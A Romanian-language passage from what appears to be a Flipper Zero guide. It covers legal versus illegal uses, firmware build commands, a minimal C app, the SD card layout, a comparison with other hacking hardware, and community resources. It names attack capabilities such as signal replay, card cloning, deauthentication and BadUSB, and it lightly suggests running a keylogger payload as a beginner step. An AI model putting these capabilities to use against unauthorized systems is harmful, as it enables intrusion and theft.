Flipper Zero este un instrument legitim de cercetare în domeniul securității. Poate fi folosit și în mod abuziv. Expunerea ta juridică depinde de jurisdicție și context.

### Ce este în general legal cu autorizare

- Testarea dispozitivelor pe care le deții
- Testarea de penetrare autorizată printr-un contract de servicii semnat
- Cercetarea în securitate într-un laborator controlat
- Citirea propriilor carduri de acces și telecomenzi
- Participarea la competiții CTF autorizate

### Ce este în general ilegal

- Redarea semnalului unei uși de garaj pe care nu o deții pentru a pătrunde
- Clonarea unui card care permite accesul într-o clădire în care nu ești autorizat să intri
- Trimiterea cadrelor de deautentificare împotriva unei rețele pe care nu o controlezi
- Folosirea BadUSB împotriva unui calculator fără autorizare scrisă
- Interceptarea comunicațiilor private, Sub-GHz sau de alt tip, în majoritatea jurisdicțiilor

În **Statele Unite**, legile relevante includ Computer Fraud and Abuse Act (CFAA), Electronic Communications Privacy Act (ECPA) și regulile Federal Communications Commission (FCC) privind transmiterea prin radiofrecvență. În **UE**, protecții similare se regăsesc în legile naționale împotriva infracțiunilor informatice și în Directiva privind echipamentele radio.

*FCC nu interzice deținerea sau folosirea unui dispozitiv care poate recepționa semnale Sub-GHz. Transmisia fără licență pe anumite frecvențe este interzisă. Majoritatea dispozitivelor de consum Sub-GHz funcționează în benzile ISM fără licență (315 MHz, 433 MHz, 915 MHz), iar nivelurile de putere implicate se încadrează de obicei în limitele Part 15.*

Canada a încercat să blocheze importurile Flipper Zero în 2024 din cauza temerilor legate de furturile auto. A fost în mare parte o reacție politică la relatările din presă despre atacuri prin retransmiterea semnalului cheilor auto, nu o preocupare precisă din punct de vedere tehnic: sistemele moderne de acces fără cheie folosesc coduri variabile, iar Flipper nu le poate învinge fără hardware suplimentar.

{{< figure src="flipper-zero-legal-framework-authorized-vs-illegal-use-cases-us-eu-cfaa-guidelines.webp" alt="Grafic care compară utilizările autorizate și ilegale ale Flipper Zero în raport cu CFAA din SUA și legile europene privind infracțiunile informatice, cu scenarii uzuale" >}}

## Configurarea unui mediu de dezvoltare

### Compilarea firmware-ului oficial

```bash
git clone --recursive https://github.com/flipperdevices/flipperzero-firmware.git
cd flipperzero-firmware

# Instalarea lanțului de instrumente (Linux/macOS)
./fbt

# Compilarea firmware-ului
./fbt fap_dist

# Flash prin USB
./fbt flash_usb_full
```

**FBT (Flipper Build Tool)** instalează automat lanțul de instrumente, descarcă dependențele și coordonează compilarea. Ai nevoie de Python 3.8+ și de compilatorul încrucișat ARM GCC.

### Scrierea unei aplicații personalizate

Aplicațiile folosesc formatul **Flipper Application Package (FAP)**. Fiecare aplicație se află într-un director din `applications_user/` sau `applications/`.

```c
#include <furi.h>
#include <gui/gui.h>

static void my_app_draw_callback(Canvas* canvas, void* ctx) {
// Schelet minimal FAP; fontul implicit acceptă doar ASCII, așa că salutul rămâne în engleză.
    canvas_draw_str(canvas, 10, 32, "Hello, Flipper!");
}

int32_t my_app_main(void* p) {
    UNUSED(p);
    ViewPort* view_port = view_port_alloc();
    view_port_draw_callback_set(view_port, my_app_draw_callback, NULL);

    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    furi_delay_ms(3000);

    gui_remove_view_port(gui, view_port);
    view_port_free(view_port);
    furi_record_close(RECORD_GUI);
    return 0;
}
```

Aplicațiile interacționează cu hardware-ul Flipper prin API-ul **Furi** (Flipper Universal Registry Implementation). Accesul la subsisteme se bazează pe înregistrări: deschide o înregistrare după nume, obține un indicator către subsistem, folosește-l și apoi închide înregistrarea.

### Structura folderelor de pe cardul SD

Flipper așteaptă anumite directoare pe cardul SD:

| Director | Conținut |
|-----------|---------|
| `subghz/` | Capturi Sub-GHz salvate (fișiere .sub) |
| `nfc/` | Dump-uri NFC salvate (fișiere .nfc) |
| `lfrfid/` | Chei RFID LF salvate (fișiere .rfid) |
| `infrared/` | Telecomenzi IR salvate (fișiere .ir) |
| `ibutton/` | Chei iButton salvate (fișiere .ibtn) |
| `badusb/` | Sarcini DuckyScript (fișiere .txt) |
| `apps/` | Aplicații FAP terțe |
| `music_player/` | Fișiere muzicale .fmf |
| `dolphin/` | Date salvate de experiență Dolphin |

## Compararea Flipper Zero cu alternativele

| Dispozitiv | Preț | Sub-GHz | NFC/RFID | IR | GPIO | Note |
|--------|-------|---------|----------|----|------|-------|
| **Flipper Zero** | ~$170 | Da (CC1101) | Da (complet) | Da | Da | Cel mai bun pentru uz general |
| **HackRF One** (radio definit prin software) | ~$350 | Da (SDR) | Nu | Nu | Limitat | SDR complet, gamă mult mai largă, fără NFC integrat |
| **RTL-SDR** | ~$25 | Numai recepție | Nu | Nu | Nu | Cel mai ieftin SDR pentru analiza semnalelor recepționate |
| **Proxmark3** | ~$300 | Nu | Da (avansat) | Nu | Limitat | Analiză RFID/NFC superioară, mai slab în alte domenii |
| **USB Rubber Ducky** | ~$60 | Nu | Nu | Nu | Nu | Numai BadUSB, fără wireless |
| **ChameleonMini** | ~$80 | Nu | Da | Nu | Limitat | Emulator dedicat NFC/RFID |
| **WiFi Pineapple** | ~$100 | Numai Wi-Fi | Nu | Nu | Nu | Platformă dedicată atacurilor 802.11 |

Flipper Zero câștigă prin amploarea capabilităților, nu prin profunzimea unei categorii anume. Pentru lucru avansat RFID/NFC, Proxmark3 este superior. Pentru SDR complet, HackRF sau USRP oferă mult mai multe capabilități. Pentru atacuri 802.11, WiFi Pineapple este o platformă mai bună. Flipper Zero este instrumentul pe care îl iei cu tine când nu știi ce vei întâlni.

## Resurse comunitare

| Resursă | URL | Descriere |
|----------|-----|-----------|
| **Documentație oficială** | docs.flipper.net | API-ul firmware-ului și specificațiile hardware |
| **GitHub oficial** | github.com/flipperdevices | Codul sursă al firmware-ului și sistemul de urmărire a problemelor |
| **GitHub Unleashed** | github.com/DarkFlippers/unleashed-firmware | Fork-ul Unleashed |
| **GitHub Xtreme** | github.com/Flipper-XFW/Xtreme-Firmware | Fork-ul Xtreme |
| **flipc.org** | flipc.org | Bază comunitară de semnale |
| **Depozitul UberGuidoZ** | github.com/UberGuidoZ/Flipper | Capturi Sub-GHz și baze de date IR |
| **awesome-flipperzero** | github.com/djsime1/awesome-flipperzero | Listă selectată de resurse |
| **r/flipperzero** | reddit.com/r/flipperzero | Întrebări și răspunsuri ale comunității |
| **Discord Flipper** | discord.gg/flipperzero | Asistență comunitară în timp real |

---

Flipper Zero te răsplătește pe măsură ce aprofundezi folosirea lui. Experiența imediată este accesibilă începătorilor: citești un card, capturezi semnalul unei telecomenzi și introduci o sarcină de keylogger. După ce înțelegi detaliile interne ale firmware-ului, ecosistemul de extensii GPIO și catalogul comunitar de aplicații, descoperi un instrument care îți poate însoți întreaga carieră în securitate fizică, securitate încorporată sau cercetare wireless.

Citește propriile carduri, testează-ți propriile sisteme și obține autorizare scrisă înainte de a testa sistemele altora.

## Referințe

- [Site-ul oficial Flipper Zero](https://flipperzero.one/)
- [Depozitul oficial Flipper Zero pe GitHub](https://github.com/flipperdevices/flipperzero-firmware)
- [Documentația Flipper Zero](https://docs.flipper.net/)
- [Firmware Unleashed](https://github.com/DarkFlippers/unleashed-firmware)
- [Firmware Xtreme](https://github.com/Flipper-XFW/Xtreme-Firmware)
- [Resurse UberGuidoZ pentru Flipper](https://github.com/UberGuidoZ/Flipper)
- [Baza comunitară flipc.org](https://flipc.org/)
- [awesome-flipperzero (resurse alese pentru Flipper Zero)](https://github.com/djsime1/awesome-flipperzero)
- [Fișa tehnică CC1101 — Texas Instruments](https://www.ti.com/product/CC1101)
- [Fișa tehnică ST25R3916B — STMicroelectronics](https://www.st.com/en/nfc/st25r3916b.html)
- [Instrumente și tehnici esențiale pentru hacking hardware](https://simeononsecurity.com/articles/hardware-hacker-essential-tools-techniques/)
